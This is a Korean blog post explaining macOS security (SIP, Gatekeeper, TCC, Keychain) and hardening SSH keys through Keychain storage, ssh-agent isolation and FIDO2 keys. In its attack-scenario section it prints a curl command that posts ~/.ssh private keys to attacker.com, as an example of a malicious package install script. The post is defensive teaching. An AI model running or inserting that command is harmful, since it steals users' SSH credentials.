---
layout: post
title: "macOS 보안 모델 완벽 가이드 - SSH, Keychain, TCC 중심"
date: 2026-01-24
categories: [infra, security]
tags: [macos, security, ssh, keychain, tcc]
description: "macOS의 보안 아키텍처를 심층 분석합니다. UID 기반 권한 모델의 한계, TCC의 실제 보호 범위, SSH 키 보안 전략, 그리고 실용적인 보안 강화 방법을 다룹니다."
image: /assets/images/posts/2026/macos-security-thumbnail.png
---

## 한 줄 요약

macOS는 **"같은 사용자(UID) = 같은 권한"**을 기본 전제로 한다. 따라서 실질적인 보안은 OS 기본 설정이 아니라 **사용자가 신뢰 경계를 어떻게 설계하느냐**에 달려 있다.

---

## 1. macOS 보안 아키텍처 개요

### 계층별 보안 메커니즘

```
┌─────────────────────────────────────────────┐
│           하드웨어 (Secure Enclave)          │
├─────────────────────────────────────────────┤
│    커널 (SIP, Sandbox, Endpoint Security)   │
├─────────────────────────────────────────────┤
│  시스템 서비스 (Gatekeeper, Keychain, TCC)  │
├─────────────────────────────────────────────┤
│              사용자 앱 레이어               │
└─────────────────────────────────────────────┘
```

### 핵심 철학: UNIX 권한 모델

- 같은 사용자 UID로 실행된 모든 프로세스는 **동등한 권한**
- UI 앱 / CLI / 백그라운드 프로세스 구분 없음
- "사용자가 인지하고 실행했다"는 개념은 보안 정책에 없음

> 내가 실행한 코드 = 내가 한 행동

이것이 UNIX / macOS 보안 모델의 근간이다.

---

## 2. 시스템 레벨 보호 메커니즘

### SIP (System Integrity Protection)

macOS El Capitan(10.11)부터 도입된 핵심 보안 기능이다.

**보호 대상:**
- `/System`, `/usr`, `/bin`, `/sbin` 디렉토리
- 시스템 프로세스에 대한 코드 인젝션 차단
- 커널 확장(kext) 로딩 제한

**한계:**
- 사용자 홈 디렉토리(`~`)는 보호하지 않음
- `csrutil disable`로 비활성화 가능 (Recovery Mode 필요)

### Gatekeeper와 Notarization

**Gatekeeper 역할:**
- 앱 실행 전 코드 서명 검증
- Apple 인증 개발자 서명 확인
- 격리(quarantine) 속성 확인

**Notarization (macOS Mojave+):**
- Apple 서버에서 악성코드 스캔 완료 증명
- 온라인 인증서 유효성 검사

**우회 가능한 상황:**
- 사용자가 직접 우클릭 → 열기로 실행
- `xattr -d com.apple.quarantine` 명령으로 격리 해제
- 이미 신뢰된 앱 내부의 악성 코드

### App Sandbox

App Store 앱에 강제되는 격리 환경이다.

**제한 사항:**
- 파일 시스템 접근 제한
- 네트워크 접근 제어
- 하드웨어 접근 제한

**중요한 점:**
- App Store 외부 앱은 Sandbox 적용 선택 사항
- 개발 도구(VS Code, Terminal 등)는 대부분 Sandbox 미적용

---

## 3. TCC (Transparency, Consent, and Control)

### TCC가 보호하는 영역

| 보호 대상 | 설명 |
|----------|------|
| Desktop / Documents / Downloads | 사용자 데이터 폴더 |
| 카메라 / 마이크 | 하드웨어 접근 |
| 화면 녹화 | 스크린 캡처 |
| 위치 정보 | GPS/WiFi 기반 위치 |
| 연락처 / 캘린더 / 사진 | 개인 데이터 |

### TCC의 한계

| 보호하지 않는 영역 | 이유 |
|------------------|------|
| SSH 키 (`~/.ssh`) | 개인정보가 아닌 인증 자격 |
| 설정 파일 (`~/.bashrc`, `~/.zshrc`) | 시스템 설정 |
| 네트워크 연결 | TCC 범위 외 |
| 프로세스 간 통신 | UNIX 권한으로 위임 |

**핵심 인식:**
> TCC는 **개인정보 보호와 사용자 알림**을 위한 시스템이지, 로컬 악성 코드 방어 시스템이 아니다.

### TCC 허용 후 동작

한 번 앱에 권한을 허용하면:
- 이후 **무인(unattended) 접근** 가능
- 백그라운드에서도 접근 가능
- 사용자 추가 확인 없음

---

## 4. UNIX 파일 권한의 실제 의미

### chmod 600의 보호 범위

```bash
chmod 600 ~/.ssh/id_ed25519
```

| 보호 대상 | 효과 |
|---------|------|
| 다른 사용자 (다른 UID) | ⭕ 보호됨 |
| root 사용자 | ❌ 접근 가능 |
| 같은 사용자가 실행한 모든 프로세스 | ❌ 접근 가능 |

**결론:**
> `chmod 600`은 **보안 장치가 아니라 협약**이다. 소유자 권한으로 실행된 악성 코드는 언제든 읽을 수 있다.

### 실제 공격 시나리오

```bash
# 악성 npm 패키지가 설치 스크립트에서 실행할 수 있는 코드
curl -s -X POST https://attacker.com/collect \
  -d "$(cat ~/.ssh/id_* 2>/dev/null)"
```

npm install, pip install 등 패키지 설치 시 postinstall 스크립트가 사용자 권한으로 실행되며, `~/.ssh` 접근에 아무런 제한이 없다.

---

## 5. Keychain vs 파일 시스템 보안 비교

### 상세 비교

| 특성 | Documents 폴더 | Keychain |
|-----|---------------|----------|
| 보호 메커니즘 | TCC | 전용 암호화 DB |
| 접근 제어 단위 | 앱 | 아이템(키/비밀) |
| 인증 요구 | 최초 1회 | 설정에 따라 매번 가능 |
| Touch ID 연동 | ❌ | ⭕ |
| 백그라운드 접근 | 허용 후 가능 | 정책으로 차단 가능 |
| 유출 시 보호 | ❌ 평문 | ⭕ 암호화됨 |

### Keychain 접근 정책 설정

```bash
# Keychain에 SSH 키 추가 (macOS)
ssh-add --apple-use-keychain ~/.ssh/id_ed25519

# 접근 시마다 인증 요구 설정 (Keychain Access 앱에서)
# - "Confirm before allowing access" 체크
# - "Always require password" 선택
```

**권장 사항:**
> Private key, passphrase, API 토큰은 파일이 아닌 **Keychain에 저장**하라.

---

## 6. SSH 보안의 현실

### 기본 상태의 위험성

아무 설정 없이 macOS를 사용하면:
- 로그인한 사용자 세션의 모든 프로세스가 SSH 가능
- `~/.ssh/config`, `~/.ssh/known_hosts` 읽기/수정 가능
- ssh-agent에 로드된 키 사용 가능

> 기본 상태가 가장 위험한 상태

### Keychain + ssh-agent의 역할

| 위협 | 방어 여부 |
|----|---------|
| 키 파일 직접 유출 (평문 복사) | ⭕ 차단 (passphrase 암호화 시) |
| 백업/압축 중 유출 | ⭕ 차단 |
| 로컬 악성 프로세스의 SSH 사용 | ❌ 차단 불가 |

**중요한 인식:**
> Keychain은 **유출 방지**이지, **사용 통제 수단은 아니다**.

---

## 7. 실용적 보안 강화: ssh-agent 격리

### 목표
- 사용자가 인지한 순간에만 SSH 허용
- 백그라운드 / 몰래 실행 차단
- 특정 앱(예: VS Code)을 신뢰 경계로 설정

### 구조

```
VS Code 실행
└─ 전용 ssh-agent 시작
   └─ SSH 명령 가능

VS Code 종료
└─ agent 자동 종료
   └─ SSH 불가 (키 없음)
```

### 구현 예시: VS Code 전용 ssh-agent

**1. 래퍼 스크립트 생성 (`~/bin/code-secure`):**

```bash
#!/bin/bash

# 전용 ssh-agent 시작
eval $(ssh-agent -s)
export SSH_AUTH_SOCK

# 키 추가 (Touch ID 인증 또는 passphrase 입력)
ssh-add --apple-use-keychain ~/.ssh/id_ed25519

# VS Code 실행
/Applications/Visual\ Studio\ Code.app/Contents/MacOS/Electron "$@"

# VS Code 종료 시 agent도 종료
ssh-agent -k
```

**2. 실행 권한 부여:**

```bash
chmod +x ~/bin/code-secure
```

**3. 기본 shell에서 agent 비활성화 (`~/.zshrc`):**

```bash
# 기본적으로 ssh-agent를 시작하지 않음
# unset SSH_AUTH_SOCK  # 필요 시 활성화
```

### 효과

- 공격 표면 축소: VS Code 실행 중에만 SSH 가능
- 사용자 의도 기반 통제
- 기본 macOS보다 명확히 안전

---

## 8. 하드웨어 키를 활용한 SSH 보안

### FIDO2/WebAuthn 하드웨어 키

YubiKey, Google Titan 등 하드웨어 보안 키를 사용하면 **물리적 터치 없이 SSH 인증 불가**.

```bash
# FIDO2 SSH 키 생성
ssh-keygen -t ed25519-sk -C "your-email@example.com"

# resident key (키가 하드웨어에만 저장)
ssh-keygen -t ed25519-sk -O resident -C "your-email@example.com"
```

**장점:**
- 키 파일 유출 무의미 (하드웨어에서만 서명 가능)
- 물리적 터치 필요 → 백그라운드 공격 차단
- 피싱 저항성

---

## 9. 막을 수 있는 것과 없는 것

### 막을 수 있는 것

| 위협 | 대응 방법 |
|-----|---------|
| 키 파일 유출 | Keychain + passphrase |
| 무인 백그라운드 SSH | ssh-agent 격리 |
| launch agent / cron 악용 | agent 격리 |
| 원격 공격자의 SSH 사용 | 하드웨어 키 (FIDO2) |

### 막을 수 없는 것 (OS 수준)

| 위협 | 이유 |
|-----|-----|
| 신뢰한 앱 내부의 악성 코드 | 앱 자체가 신뢰됨 |
| 이미 실행된 코드의 악의적 행동 | 같은 UID 권한 |
| VS Code 확장 프로그램의 악성 동작 | 앱 내부 코드 |

> 이 수준의 방어는 **하드웨어 키** 또는 **서버 측 MFA**로만 가능하다.

---

## 10. macOS 보안 체크리스트

### 필수 설정

- [ ] SIP 활성화 상태 확인: `csrutil status`
- [ ] FileVault 디스크 암호화 활성화
- [ ] Gatekeeper 활성화: `spctl --status`
- [ ] 방화벽 활성화: 시스템 설정 → 네트워크 → 방화벽
- [ ] 자동 로그인 비활성화

### SSH 보안

- [ ] SSH 키에 강력한 passphrase 설정
- [ ] 키를 Keychain에 저장: `ssh-add --apple-use-keychain`
- [ ] Ed25519 알고리즘 사용 (RSA 대신)
- [ ] 가능하면 FIDO2 하드웨어 키 사용
- [ ] 필요 시 ssh-agent 격리 구현

### 개발 환경

- [ ] npm/pip 패키지 설치 전 검토
- [ ] 불필요한 VS Code 확장 최소화
- [ ] 중요 작업은 별도 사용자 계정에서 수행 고려

---

## 11. 현실적인 보안 계층

```
┌────────────────────────────────────────┐
│  1. 하드웨어 키 / Secure Enclave       │  ← 비밀 저장 + 물리 인증
├────────────────────────────────────────┤
│  2. Keychain + passphrase             │  ← 유출 방지
├────────────────────────────────────────┤
│  3. ssh-agent 격리                    │  ← 사용 시점 통제
├────────────────────────────────────────┤
│  4. 서버 측 MFA / Bastion             │  ← 최종 방어선
└────────────────────────────────────────┘
```

---

## 12. 결론

macOS는 **"내가 실행한 코드는 나"**라고 가정한다.

OS가 제공하는 TCC, Gatekeeper, SIP는 각각의 역할이 있지만, **로컬에서 실행되는 악성 코드에 대한 완벽한 방어책은 아니다**.

진짜 보안은 OS 기본 설정에 의존하는 것이 아니라, **사용자가 신뢰 경계를 어떻게 설계하느냐**에 달려 있다:

1. **비밀은 Keychain에** - 파일이 아닌 전용 저장소
2. **인증은 격리하여** - ssh-agent를 필요할 때만 활성화
3. **물리적 확인을** - 하드웨어 키로 백그라운드 공격 차단
4. **서버에서 검증을** - 클라이언트를 신뢰하지 말 것

---

## 참고 자료

- [Apple Platform Security Guide](https://support.apple.com/guide/security/welcome/web)
- [Apple Keychain Services](https://developer.apple.com/documentation/security/keychain_services)
- [TCC Database 구조](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
- [FIDO2 SSH Key 설정](https://developers.yubico.com/SSH/)
